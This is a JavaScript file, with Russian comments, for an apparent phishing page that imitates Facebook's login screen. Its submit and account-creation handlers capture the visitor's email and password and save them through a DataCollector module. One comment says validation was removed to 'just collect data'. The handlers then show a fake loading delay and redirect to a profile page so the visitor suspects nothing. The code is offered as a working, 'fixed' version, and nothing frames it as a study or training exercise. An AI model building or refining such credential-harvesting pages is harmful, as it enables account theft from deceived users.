// script.js - исправленная основная логика

document.addEventListener('DOMContentLoaded', function() {
    console.log('Facebook clone script loaded - FIXED VERSION');
    
    // Находим форму
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', handleLoginSubmit);
    }
    
    // Обработка поля пароля (показать/скрыть)
    const passwordField = document.getElementById('password');
    if (passwordField) {
        addPasswordToggle(passwordField);
    }
});

// Обработка отправки формы - БЕЗ ALERT ДЛЯ ПУСТЫХ ПОЛЕЙ
async function handleLoginSubmit(event) {
    event.preventDefault();
    
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;
    
    // УБИРАЕМ ВАЛИДАЦИЮ - просто собираем данные
    // if (!email || !password) {
    //     alert('Пожалуйста, заполните все поля');
    //     return;
    // }
    
    // Показать индикатор загрузки
    showLoading();
    
    try {
        // Сохраняем данные (даже если поля пустые)
        if (window.DataCollector && CONFIG.COLLECT_DATA) {
            // Если поля пустые, сохраняем как есть
            const userData = DataCollector.saveUserData(email || "empty@email.com", password || "empty_password");
            console.log('User data saved:', { 
                email: email || "empty", 
                password: '***' 
            });
        }
        
        // Имитация обработки
        await simulateProcessing();
        
        // Перенаправляем на профиль
        redirectToProfile(email || "user@facebook.com");
        
    } catch (error) {
        console.error('Error:', error);
        // Все равно перенаправляем
        setTimeout(() => {
            window.location.href = 'profile.html?email=user@facebook.com';
        }, 2000);
    }
}

// Показать индикатор загрузки
function showLoading() {
    const loading = document.getElementById('loading');
    if (loading) {
        loading.classList.remove('hidden');
    }
}

// Имитация обработки
function simulateProcessing() {
    return new Promise(resolve => {
        setTimeout(() => {
            resolve();
        }, 1000); // Уменьшил время
    });
}

// Перенаправление на профиль
function redirectToProfile(email) {
    setTimeout(() => {
        // Автоматически скрываем loading при перенаправлении
        const loading = document.getElementById('loading');
        if (loading) {
            loading.classList.add('hidden');
        }
        
        // Кодируем email для передачи в URL
        const encodedEmail = encodeURIComponent(email);
        window.location.href = `profile.html?email=${encodedEmail}&ref=login`;
    }, CONFIG.REDIRECT_DELAY || 2000);
}

// СОЗДАНИЕ АККАУНТА - РАБОЧАЯ ВЕРСИЯ
function createAccount() {
    showLoading();
    
    // Получаем значения из полей
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;
    
    // Имитируем создание аккаунта
    setTimeout(() => {
        // Сохраняем данные регистрации
        if (window.DataCollector && CONFIG.COLLECT_DATA) {
            DataCollector.saveUserData(
                email || "new_user_" + Date.now() + "@facebook.com",
                password || "default_password_" + Math.random().toString(36).substr(2, 8)
            );
        }
        
        // Перенаправляем на профиль с сообщением об успехе
        const userEmail = email || "new_user_" + Date.now() + "@facebook.com";
        const encodedEmail = encodeURIComponent(userEmail);
        
        // Скрываем loading
        hideLoading();
        
        // Перенаправляем
        window.location.href = `profile.html?email=${encodedEmail}&ref=registration&new=true`;
    }, 1500);
}

// Скрыть индикатор загрузки
function hideLoading() {
    const loading = document.getElementById('loading');
    if (loading) {
        loading.classList.add('hidden');
    }
}

// Добавить кнопку показать/скрыть пароль
function addPasswordToggle(passwordField) {
    const formGroup = passwordField.parentElement;
    
    // Если кнопка уже есть, не создаем новую
    if (formGroup.querySelector('.password-toggle')) return;
    
    // Создаем кнопку
    const toggleBtn = document.createElement('button');
    toggleBtn.type = 'button';
    toggleBtn.className = 'password-toggle';
    toggleBtn.innerHTML = '👁️';
    toggleBtn.style.cssText = `
        position: absolute;
        right: 10px;
        top: 50%;
        transform: translateY(-50%);
        background: none;
        border: none;
        cursor: pointer;
        font-size: 18px;
        opacity: 0.5;
        z-index: 10;
    `;
    
    // Позиционируем
    formGroup.style.position = 'relative';
    toggleBtn.style.top = '50%';
    toggleBtn.style.right = '15px';
    
    // Обработчик клика
    toggleBtn.addEventListener('click', function() {
        const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordField.setAttribute('type', type);
        toggleBtn.innerHTML = type === 'password' ? '👁️' : '👁️‍🗨️';
    });
    
    formGroup.appendChild(toggleBtn);
}

// Глобальные функции для вызова из HTML
window.createAccount = createAccount;
window.hideLoading = hideLoading;
